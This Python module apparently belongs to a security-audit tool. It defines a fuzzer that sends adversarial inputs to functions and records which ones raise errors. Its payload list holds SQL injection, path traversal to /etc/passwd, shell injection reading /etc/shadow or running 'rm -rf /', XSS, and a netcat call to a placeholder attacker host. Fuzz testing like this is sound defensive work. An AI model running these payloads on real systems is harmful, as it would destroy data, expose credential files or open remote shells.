from __future__ import annotations

"""Light-weight fuzzing utilities used by CoAuditAI dynamic analysis."""

from dataclasses import dataclass
from typing import Callable, Iterable, List, Sequence
import random
import string

__all__ = ["FuzzResult", "AttackSurfaceFuzzer"]


@dataclass
class FuzzResult:
    """Result of executing a fuzz payload against a callable."""

    payload: str
    triggered: bool
    notes: str | None = None
    error: str | None = None
    exception: Exception | None = None


class AttackSurfaceFuzzer:
    """Generate adversarial payloads and exercise exposed callables."""

    _DEFAULT_PAYLOADS: Sequence[str] = (
        "__import__('os').system('id')",
        "'; DROP TABLE users; --",
        "../../../../etc/passwd",
        "$(reboot)",
        "| cat /etc/shadow",
        "$(rm -rf /)",
        "admin' OR '1'='1",
        "<script>alert('xss')</script>",
        "${{7*7}}",
        "' || true || '",
        '"; BEGIN malicious; --',
    )

    def __init__(self, seed: int | None = None, max_payloads: int = 12) -> None:
        self._seed = seed if seed is not None else random.SystemRandom().randbits(64)
        self._rng = random.Random(self._seed)
        self.max_payloads = max_payloads

    # ------------------------------------------------------------------
    @property
    def seed(self) -> int:
        return self._seed

    # ------------------------------------------------------------------
    def generate_payloads(self, base: str | None = None) -> List[str]:
        """Return a deterministic selection of fuzz payloads."""

        payloads = list(self._DEFAULT_PAYLOADS)
        if base:
            payloads.append(base + "' OR '1'='1")
            payloads.append(base + " && nc attacker 4444")
            payloads.append(base.replace(" ", "\n"))

        # Randomly mutate or shuffle to add diversity while staying deterministic
        shuffled = payloads[:]
        self._rng.shuffle(shuffled)
        if len(shuffled) > self.max_payloads:
            shuffled = shuffled[: self.max_payloads]

        # Inject some random printable noise to stress parsers
        augmented: List[str] = []
        for item in shuffled:
            if self._rng.random() < 0.3:
                noise = "".join(self._rng.choice(string.punctuation) for _ in range(3))
                augmented.append(f"{item}{noise}")
            else:
                augmented.append(item)
        return augmented

    # ------------------------------------------------------------------
    def fuzz_callable(self, func: Callable[[str], object], payloads: Iterable[str]) -> List[FuzzResult]:
        """Execute ``func`` against ``payloads`` capturing raised errors."""

        results: List[FuzzResult] = []
        for payload in payloads:
            try:
                func(payload)
            except Exception as exc:  # noqa: BLE001 - surface to caller
                results.append(FuzzResult(payload=payload, triggered=True, error=str(exc), exception=exc))
            else:
                results.append(FuzzResult(payload=payload, triggered=False))
        return results
